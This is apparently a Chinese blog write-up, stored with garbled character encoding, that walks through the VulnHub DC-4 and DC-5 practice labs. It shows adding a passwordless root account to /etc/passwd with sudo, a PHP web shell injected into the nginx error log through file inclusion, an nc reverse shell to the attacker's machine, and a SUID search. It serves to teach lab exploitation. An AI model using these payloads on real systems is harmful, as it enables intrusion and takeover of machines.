<p><img src="/post/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></p>
<p>å‘ç°æœ‰ä¸€å°åä¸º<code>jim</code>çš„é‚®ä»¶ï¼ŒæŸ¥çœ‹ä¿¡æ¯</p>
<blockquote>
<p>è¾“å…¥<code>cat jim</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></p>
<p>å‘ç°æ˜¯<code>charles</code>å‘ç»™<code>jim</code>çš„é‚®ä»¶</p>
<blockquote>
<p><code>Hi Jim,</code></p>
<p><code>I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</code></p>
<p><code>Password is:  ^xHhA&amp;hvim0y</code></p>
<p><code>See ya,</code><br><code>Charles</code></p>
<p>ç¿»è¯‘ï¼š<br>å—¨ï¼Œå‰å§†ï¼Œ</p>
<p>æˆ‘ä»Šå¤©å¹´åº•è¦æ”¾å‡ï¼Œæ‰€ä»¥è€æ¿è®©æˆ‘æŠŠå¯†ç ç»™ä½ ï¼Œä»¥é˜²ä¸‡ä¸€ã€‚</p>
<p>å¯†ç æ˜¯ï¼š^xHhA&amp;hvim0y</p>
<p>å†è§ï¼Œ<br>æŸ¥å°”æ–¯</p>
</blockquote>
<p>ä¿¡é‡Œæåˆ°ä»–è‡ªå·±çš„å¯†ç </p>
<blockquote>
<p><code>^xHhA&amp;hvim0y</code></p>
</blockquote>
<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥ç™»å½•<code>charles</code>çš„è´¦å·ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ‡æ¢ç”¨æˆ·</p>
<blockquote>
<p>è¾“å…¥<code>su charles</code></p>
</blockquote>
<p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p>
<p><img src="/post/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></p>
<p>å…ˆçœ‹çœ‹<code>charles</code>èƒ½æ‰§è¡Œä»€ä¹ˆç®¡ç†å‘˜å‘½ä»¤</p>
<blockquote>
<p>è¾“å…¥<code>sudo -l</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></p>
<p>å‘ç°<code>charles</code>å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜çš„<code>teehee</code>å‘½ä»¤</p>
<h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>æˆ‘ä»¬å…ˆéœ€è¦çŸ¥é“è¿™ä¸ªå‘½ä»¤æ˜¯å¹²ä»€ä¹ˆçš„</p>
<blockquote>
<p>è¾“å…¥<code>teehee -h</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></p>
<p><u><strong>å‘ç°å®ƒæ˜¯å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„æ•°æ®ï¼Œ-aæŒ‡ä»¤èƒ½å¤Ÿä¿è¯ä¿®æ”¹æ–‡ä»¶ä¸ä¼šè¦†ç›–åŸæœ‰æ–‡ä»¶</strong></u></p>
<p>é‚£æˆ‘ä»¬éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå°±å¯ä»¥åœ¨<code>/etc/passwd</code>é‡Œé¢æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·æ•°æ®</p>
<h3 id="æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·"><a href="#æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·" class="headerlink" title="æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·"></a>æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</h3><blockquote>
<p>è¾“å…¥<code>sudo teehee -a /etc/passwd</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></p>
<p>ç„¶åå°±ç­‰å¾…æˆ‘ä»¬è¾“å…¥æ•°æ®</p>
<p><img src="/post/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></p>
<p>æŒ‰ç…§<code>root</code>ç”¨æˆ·æ ¼å¼ï¼Œæˆ‘ä»¬æ·»åŠ è‡ªå·±çš„æ•°æ®</p>
<blockquote>
<p>è¾“å…¥<br><code>ttoc:</code>(è¿™é‡Œæ˜¯å¯†ç ï¼Œå¯ä»¥åŠ å…¥è‡ªå·±çš„å“ˆå¸Œåçš„å¯†ç ï¼Œå½“ç„¶ä¸åŠ å°±å¯ä»¥ç›´æ¥ç™»å½•ï¼Œè¿™é‡Œæˆ‘ä¸åŠ ï¼Œå¿½ç•¥)<code>:0:0:root:/root:/bin/bash</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></p>
<p>æ·»åŠ æˆåŠŸï¼Œæˆ‘ä»¬å†çœ‹çœ‹èƒ½ä¸èƒ½ç™»å½•ï¼Œæ˜¯ä¸æ˜¯ç®¡ç†å‘˜</p>
<p><img src="/post/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></p>
<p>å‘ç°æ˜¯ç®¡ç†å‘˜ï¼Œç›´æ¥åˆ°<code>root</code>ç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹ <code>flag</code>å³å¯</p>
<p><img src="/post/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯<br>æ­å–œï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-4ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>è°æä¾›äº†åé¦ˆï¼Œè°èŠ±æ—¶é—´å®Œæˆäº†è¿™äº›å°äº‹<br>æŒ‘æˆ˜ã€‚</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1 id="äº”ã€DC-5-é«˜çº§"><a href="#äº”ã€DC-5-é«˜çº§" class="headerlink" title="äº”ã€DC-5[é«˜çº§]"></a>äº”ã€DC-5[é«˜çº§]</h1><p><strong>only one flag</strong></p>
<h2 id="ä¿¡æ¯æ”¶é›†-4"><a href="#ä¿¡æ¯æ”¶é›†-4" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å®˜æ–¹æ–‡æ¡£é‡Œæœ‰ä¸€äº›æç¤ºè¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹</p>
<blockquote>
<p><code>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide soKme kind of idea as to what the vulnerability might involve.</code></p>
<p><code>And just for the record, there is no phpmailer exploit involved. :-)</code><br>ç¿»è¯‘ï¼š<br>æ®æˆ‘æ‰€çŸ¥ï¼Œåªæœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„å…¥å£ç‚¹å¯ä»¥è¿›å…¥ï¼ˆä¹Ÿæ²¡æœ‰ SSHï¼‰ã€‚è¿™ä¸ªç‰¹å®šçš„å…¥å£ç‚¹å¯èƒ½å¾ˆéš¾è¯†åˆ«ï¼Œä½†å®ƒå°±åœ¨é‚£é‡Œã€‚æ‚¨éœ€è¦å¯»æ‰¾ä¸€äº›ä¸ä¼—ä¸åŒçš„ä¸œè¥¿ï¼ˆéšç€é¡µé¢çš„åˆ·æ–°è€Œæ”¹å˜çš„ä¸œè¥¿ï¼‰ã€‚è¿™æœ‰æœ›ä¸ºæ¼æ´å¯èƒ½æ¶‰åŠçš„å†…å®¹æä¾›æŸç§æƒ³æ³•ã€‚</p>
<p>åªæ˜¯ä¸ºäº†è®°å½•ï¼Œæ²¡æœ‰æ¶‰åŠ phpmailer æ¼æ´åˆ©ç”¨ã€‚:-)</p>
<p>&#x3D;&#x3D;&gt;å¤§è‡´å…³é”®çš„ä¿¡æ¯å°±æ˜¯ï¼Œåœ¨æˆ‘ä»¬åˆ·æ–°ç½‘é¡µçš„æ—¶å€™æœ‰çš„ä¸œè¥¿ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå¯¹åº”æŸç§æ¼æ´</p>
</blockquote>
<p>å…»æˆä¹ æƒ¯ï¼Œå…ˆé¡ºæ‰‹ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></p>
<p>å‘ç°<code>80</code>ç«¯å£æ­£å¸¸è¿è¡Œç€<code>http</code>ï¼Œ<code>54235</code>ç«¯å£æ‰“å¼€</p>
<hr>
<p>æˆ‘ä»¬è®¿é—®<code>192.168.133.143</code></p>
<p>å…ˆä¹ æƒ¯çœ‹çœ‹<code>Wappalyzer</code>åŸºæœ¬ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p>
<p>å‘ç°æœ‰5ä¸ªçª—å£</p>
<p><img src="/post/vulnhub/image-20220930190329914.png" alt="image-20220930190329914"></p>
<p>æŒ¨ä¸ªè®¿é—®ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨æˆ–è€…äº¤äº’çš„åœ°æ–¹</p>
<p><img src="/post/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></p>
<p><img src="/post/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></p>
<p>å‘ç°<code>Concat</code>çª—å£ä¸‹æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œå¯ä»¥å®ç°äº¤äº’æ•ˆæœï¼Œæˆ‘ä»¬ä¹±è¾“å…¥ä¸€äº›æ•°æ®å…ˆè¯•è¯•</p>
<p>çœ‹çœ‹å˜åŒ–</p>
<p><img src="/post/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></p>
<p>å‘ç°<code>url</code>åœ¨æäº¤æ—¶å‘ç”Ÿçš„è·³è½¬ï¼Œå¹¶ä¸”æ˜¾ç¤ºäº†ä¸€äº›ä¿¡æ¯</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>çœ‹å¾—å‡ºæ¥ï¼Œç½‘ç«™è·³è½¬åˆ°äº†<code>thankyou.php</code>ï¼Œè€Œä¸”æˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯ä¹Ÿè¢«ä»¥æ˜æ–‡æ–¹å¼æ˜¾ç¤ºå‡ºæ¥äº†</p>
<p>é‚£æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æƒ³èµ·ä¹‹å‰ä½œè€…ç»™çš„æç¤ºï¼Œè¯´<strong>åˆ·æ–°çš„æ—¶å€™ä¼šå‘ç”Ÿå˜åŒ–</strong>ï¼Œæˆ‘ä»¬åˆ·æ–°çœ‹çœ‹</p>
<p><img src="/post/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></p>
<p><img src="/post/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></p>
<p>å¯¹æ¯”ä¸¤ä¸ªå›¾å¯ä»¥å‘ç°ï¼Œåº•ä¸‹çš„å¹´ä»½æ—¶é—´å‘ç”Ÿäº†æ”¹å˜ï¼Œ<strong>åˆ·æ–°ä¸€æ¬¡ï¼Œå¢åŠ ä¸€å¹´</strong></p>
<p>è¿™ä¸ªè‚¯å®šæ˜¯æœ‰ç”¨çš„ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿˜æ˜¯ä¸çŸ¥é“</p>
<p>æˆ‘ä»¬å…ˆè¦äº†è§£è¿™ä¸ªå˜åŒ–è‚¯å®šæ˜¯æœ‰æ–‡ä»¶æ¥è°ƒç”¨çš„ï¼Œè€Œæˆ‘ä»¬è‚¯å®šæ˜¯å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦å†æ¬¡é’ˆå¯¹æ€§çš„è¿›è¡Œä¿¡æ¯æ”¶é›†</p>
<p>ç”¨ç»å…¸çš„<code>dirsearch</code>æ¥æ‰«ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></p>
<p>é™¤å»æˆ‘ä»¬å·²ç»è®¿é—®è¿‡çš„æ–‡ä»¶å’Œå“åº”ç 403çš„ï¼Œå‘ç°æœ‰ä¸€ä¸ªå«åš<code>footer.php</code>æ–‡ä»¶ï¼Œåˆšå¥½å’Œæˆ‘ä»¬çš„å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ä¸€è‡´ï¼Œä¹Ÿæ˜¯<code>åº•éƒ¨æ–‡æœ¬</code>å˜åŒ–</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.133.143/footer.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></p>
<p>å‘ç°æœç„¶æ˜¯æˆ‘ä»¬å‘ç°å˜åŒ–çš„é‚£ä¸ªåœ°æ–¹ï¼Œè€Œä¸”æˆ‘ä»¬åˆ·æ–°æ—¶ï¼Œä¹Ÿä¼šåŒæ—¶å˜åŒ–</p>
<hr>
<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>æ‰€ä»¥æŒ‰ä¸Šé¢æˆ‘ä»¬æ¨åˆ°çš„æ€è·¯ï¼Œå’Œä¿¡æ¯çš„æ”¶é›†ï¼Œ</p>
<p><code>concat.php</code>çš„åº•éƒ¨ä¸ºäº†æ˜¾ç¤ºå’Œ<code>footer.php</code>çš„å®ç°åŠŸèƒ½ï¼Œè‚¯å®šæ˜¯å®ç°äº†æ–‡ä»¶åŒ…å«ï¼Œ</p>
<p><code>concat.php</code>æŠŠ<code>footer.php</code>æ–‡ä»¶åŒ…å«äº†</p>
<p>&#x3D;&#x3D;&gt;æˆ‘ä»¬æ¸—é€çš„åŸºç¡€æ€è·¯å°±å˜æˆäº†<strong>åˆ©ç”¨çš„æ–‡ä»¶åŒ…å«   æ‹¿åˆ°shell</strong></p>
<h3 id="1-éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•"><a href="#1-éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•" class="headerlink" title="1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•"></a>1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•</h3><p>ã€æ–‡ä»¶åŒ…å«æ³¨å…¥ç‚¹å¯æ§å‚æ•°åä¸€èˆ¬ä¸º<code>file</code>ï¼Œå½“ç„¶å¦‚æœå‡ºç°æ€ä¹ˆéƒ½ä¸è¡Œçš„ï¼Œé‚£å°±å¯ä»¥ç”¨<code>çˆ†ç ´</code>**(fuzz)**æˆ–è€…æˆ‘ä»¬çš„æ€è·¯é”™è¯¯äº†ã€‘</p>
<p>æˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½åŒ…å«<code>index.php</code></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.133.143/thankyou.php?file=index.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></p>
<p>å‘ç°<code>index.php</code>ç¡®å®è¢«æˆ‘ä»¬æˆåŠŸåŒ…å«äº†ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è‚¯å®šæˆ‘ä»¬çš„æ€è·¯æ˜¯æ²¡æœ‰åç¦»äº†</p>
<h3 id="2-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell"><a href="#2-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell" class="headerlink" title="2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell"></a>2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell</h3><p>æ—¢ç„¶èƒ½å¤Ÿåœ¨<code>thank.php</code>é‡Œå®ç°æ–‡ä»¶åŒ…å«ï¼Œé‚£æˆ‘ä»¬å°±è¯•è¯•èƒ½ä¸èƒ½åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œæ¥è·å–æ›´å¤šä¿¡æ¯</p>
<h4 id="1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ"><a href="#1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ" class="headerlink" title="1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ"></a>1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ</h4><p>æ ¹æ®æˆ‘ä»¬ä¹‹å‰æ”¶é›†çš„ä¿¡æ¯ï¼Œ</p>
<p><img src="/post/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p>
<blockquote>
<p>Nginxè®¿é—®æ—¥å¿—ï¼šç½‘ç«™è®¿é—®è€…æœ‰å…³çš„æ´»åŠ¨éƒ½è®°å½•åœ¨è®¿é—®æ—¥å¿— &#x2F;&#x2F;<code>access_log</code></p>
<p>Nginxé”™è¯¯æ—¥å¿—ï¼šå½“è®¿é—®é”™è¯¯çš„æ—¶å€™ï¼Œä¼šæŠŠé”™è¯¯å‚æ•°ä¿å­˜åœ¨å…¶ä¸­  &#x2F;&#x2F;<code>error_log</code></p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„</p>
<blockquote>
<p><code>url/?file=</code> çš„åé¢åŠ ä¸Šä¸€å¥è¯ğŸï¼Œ<br>ç„¶åå› ä¸ºè®¿é—®é”™è¯¯ï¼Œé”™è¯¯å‚æ•°ã€ä¸€å¥è¯ğŸã€‘å°±ä¼šåˆ°<code>nginxçš„é”™è¯¯æ—¥å¿—</code>ä¸­ï¼Œ<br>ç„¶ååˆ©ç”¨æˆ‘ä»¬å‘ç°çš„æ–‡ä»¶åŒ…å«æŠŠé”™è¯¯æ—¥è®°åŒ…å«åœ¨<code>thankyou.php</code>æ–‡ä»¶ä¸­ï¼Œ<br>è®¿é—®æ‹¿åˆ°<code>shell</code>ï¼Œæ‹¿åˆ°<code>shell</code></p>
</blockquote>
<p><code>nginx</code>é…ç½®æ–‡ä»¶ä½ç½®ï¼š**&#x2F;etc&#x2F;nginx&#x2F;nginx.conf**</p>
<p>æˆ‘ä»¬åŒ…å«è¯¥æ–‡ä»¶çœ‹çœ‹<strong>nginxçš„é”™è¯¯æ—¥å¿—æ–‡ä»¶</strong>ä½ç½®åœ¨å“ªé‡Œ</p>
<p><img src="/post/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></p>
<p>çœ‹åˆ°æ–‡ä»¶ä½ç½®</p>
<blockquote>
<p><code>error_logï¼š/var/log/nginx/error.log</code></p>
</blockquote>
<p>å…ˆè¾“å…¥ä¸€å¥è¯ğŸï¼ŒæŠ¥é”™å¯¼å…¥<code>nginx</code>é”™è¯¯æ—¥å¿—</p>
<hr>
<p><strong>key</strong>ï¼šå¦‚æœç›´æ¥åœ¨ç½‘é¡µè¾“å…¥ä¸€å¥è¯ğŸå¯¼å…¥é”™è¯¯æ—¥å¿—æ˜¯æœ‰é—®é¢˜çš„</p>
<blockquote>
<p>å½“æˆ‘ä»¬è®¿é—®<code>http://192.168.133.143/thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
<p>è™½ç„¶ç¡®å®æŠŠè¿™ä¸ªä¿¡æ¯å¯¼å…¥åˆ°äº† <code>/var/log/nginx/error.log</code> æ–‡ä»¶é‡Œ</p>
<p>ä½†æ˜¯å‰ç«¯ä¼¼ä¹å­˜åœ¨è¿‡æ»¤ï¼Œä¼šæŠŠ&lt;&gt;å’Œâ€™â€™æˆ–â€â€ï¼Œæ›¿æ¢æˆå…¶ä»–ç¬¦å·ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æƒ³è¦åˆ©ç”¨</p>
<p><code>http://192.168.133.143/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code></p>
<p>è¿™æ ·æƒ³åˆ©ç”¨æˆ‘ä»¬å¯¼å…¥çš„æœ¨é©¬æ‹¿åˆ°shellçš„æ—¶å€™ï¼Œå®é™…ä¸Šæˆ‘ä»¬çš„æœ¨é©¬å·²ç»è¢«ç ´åäº†ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä¸€ç³»åˆ—å‘½ä»¤ï¼Œæ‰€ä»¥ç”¨æŠ“åŒ…burpç›´æ¥å‘é€åˆ°æœåŠ¡å™¨ï¼Œç»•è¿‡å‰ç«¯è¿‡æ»¤å…ˆï¼Œè¿™æ ·æˆ‘ä»¬çš„ä¸€å¥è¯ğŸæ‰èƒ½å‘æŒ¥å®ƒçš„ä½œç”¨</p>
</blockquote>
<hr>
<p>æ‰€ä»¥æˆ‘ä»¬æ‰§è¡Œ<strong>æŠ“åŒ…æ“ä½œ</strong></p>
<p><img src="/post/vulnhub/image-20221001221200987.png" alt="image-20221001221200987"></p>
<p>æ²¡æœ‰å…¶ä»–å›æ˜¾å†…å®¹</p>
<p><img src="/post/vulnhub/image-20221001221849004.png" alt="image-20221001221849004"></p>
<p>æˆ‘ä»¬åœ¨æ–‡ä»¶åŒ…å«<code>/var/log/nginx/error.log</code>ï¼Œå¹¶åˆ©ç”¨<code>cmd</code>å‚æ•°æ‰§è¡Œ<code>ls</code>è¯•è¯•ï¼Œçœ‹çœ‹æ˜¯å¦çœŸçš„æŠŠæˆ‘ä»¬çš„æœ¨é©¬åŒ…å«è¿›å»äº†</p>
<p><img src="/post/vulnhub/image-20221001222035413.png" alt="image-20221001222035413"></p>
<p>å‘ç°ç¡®å®æˆåŠŸåŒ…å«è¿›å»äº†ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p>é‚£æˆ‘ä»¬ç›´æ¥ç”¨<code>nc</code>å‘½ä»¤åå¼¹<code>shell</code></p>
<h4 id="2ï¼‰ncå‘½ä»¤åå¼¹shell"><a href="#2ï¼‰ncå‘½ä»¤åå¼¹shell" class="headerlink" title="2ï¼‰ncå‘½ä»¤åå¼¹shell"></a>2ï¼‰ncå‘½ä»¤åå¼¹shell</h4><p>å…ˆåœ¨<code>kali</code>æ§åˆ¶å°æ‰§è¡Œ<code>nc</code>ç›‘å¬<code>8888</code>ç«¯å£</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -vv -p <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221001223417288.png" alt="image-20221001223417288"></p>
<p>ç„¶åç½‘é¡µæµè§ˆ</p>
<blockquote>
<p><code>http://192.168.133.144/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/bin/bash</code></p>
<p>&#x2F;&#x2F;<code>192.168.133.140</code>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221001223100801.png" alt="image-20221001223100801"></p>
<p>è¿”å›æ§åˆ¶å°æŸ¥çœ‹</p>
<p><img src="/post/vulnhub/image-20221001223320410.png" alt="image-20221001223320410"></p>
<p>è¿›å…¥<code>shell</code></p>
<p>ç„¶åæ ‡å‡†å§¿åŠ¿ï¼Œè¿›å…¥äº¤äº’å¼shell</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221001223408282.png" alt="image-20221001223408282"></p>
<h4 id="è·å¾—ç¨³å®šçš„shell"><a href="#è·å¾—ç¨³å®šçš„shell" class="headerlink" title="*è·å¾—ç¨³å®šçš„shell"></a>*è·å¾—ç¨³å®šçš„shell</h4><p>ã€ä¸ä¼šå› ä¸ºctrl+cé€€å‡ºï¼Œè€Œä¸”å¯ä»¥æŒ‰ä¸Šä¸‹é”®ï¼Œè¿”å›ä¹‹å‰çš„å‘½ä»¤ã€‘</p>
<blockquote>
<p>å…ˆåœ¨shellï¼Œç”¨<code>Ctrl-Z</code>å°†shellæ”¾åˆ°åå°</p>
<p>å†<br><code>stty raw -echo &amp;&amp; fg ; reset</code>  </p>
<p><code>nc -l -vv -p 8888</code>  &#x2F;&#x2F;è¿™ä¸ªä¸ç”¨è¾“å…¥ï¼Œæ˜¯è‡ªåŠ¨æ‰§è¡Œåå°çš„å‘½ä»¤è¿”å›åˆ°å‰å°</p>
<p>&#x2F;&#x2F;stty è®¾ç½®ç»ˆç«¯ç«¯å£è®¾å¤‡çš„æ¥å£é€‰é¡¹</p>
<p>&#x2F;&#x2F;echo è¡¨ç¤ºå›æ˜¾ï¼Œæ¯”å¦‚å½“-echoæ—¶ï¼Œè¾“å…¥lsåæŒ‰å›è½¦ï¼Œä»ç„¶ä¼šçœ‹åˆ°ls</p>
<p>&#x2F;&#x2F;fgæŠŠshellæåˆ°å‰å°æ¥</p>
<p>&#x2F;&#x2F;resetè¡¨ç¤ºé‡å¯ç»ˆç«¯ï¼Œæ­¤æ—¶çš„ç»ˆç«¯ä¸ºæˆ‘ä»¬é¶æœºçš„shellçª—å£ï¼Œæ‰€ä»¥ä¸å®¹æ˜“è¢«é€€å‡ºæˆ–è€…ä¸­æ–­</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221002145951718.png" alt="image-20221002145951718"></p>
<p>æˆåŠŸè·å¾—å…¨äº¤äº’å¼<code>shell</code></p>
<h3 id="3-ææƒ"><a href="#3-ææƒ" class="headerlink" title="3.ææƒ"></a>3.ææƒ</h3><p>æ‹¿åˆ°shellä»¥åï¼Œæˆ‘ä»¬æƒé™æ˜æ˜¾æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦<strong>å‚ç›´ææƒ</strong>ï¼Œæ‹¿åˆ°æœ€é«˜æƒé™</p>
<p>å…ˆçœ‹çœ‹å­˜ä¸å­˜åœ¨<code>suid</code>æ–¹å¼ææƒ</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221001223927542.png" alt="image-20221001223927542"></p>
